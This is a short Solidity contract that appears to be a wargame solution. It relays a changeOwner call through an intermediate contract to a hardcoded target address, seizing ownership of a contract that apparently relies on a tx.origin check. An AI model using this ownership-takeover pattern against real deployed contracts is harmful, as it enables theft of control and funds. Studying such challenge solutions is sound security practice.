// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Telephone {
    function changeOwner() public {
        ITelephone telephoneContract = ITelephone(address(0x22216b30352E8fAcDB71C87f72646673bC46F2c8));
        telephoneContract.changeOwner(address(0xBf639FfACbb1B4D597ae22efefe33d5D86fAD6c9));
    }
}

interface ITelephone {
    function changeOwner(address _owner) external;
}